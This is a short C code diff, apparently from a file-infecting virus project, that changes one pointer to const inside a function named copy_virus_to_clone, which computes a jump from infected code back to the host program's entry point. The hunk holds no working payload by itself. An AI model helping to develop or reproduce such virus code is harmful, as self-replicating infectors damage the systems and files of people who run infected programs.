@@ -31,7 +31,7 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 	const int32_t	rel_jump_client = -((int32_t)dist_client_entry_jump + JUMP32_INST_SIZE);
 
 	// get safe pointers in clone
-	void	*back_to_client_jump = safe(clone_ref, client_jump_off, INSTRUCTION_MAXLEN);
+	const void	*back_to_client_jump = safe(clone_ref, client_jump_off, INSTRUCTION_MAXLEN);
 
 	// safe memory and overflow check
 	if (back_to_client_jump == NULL
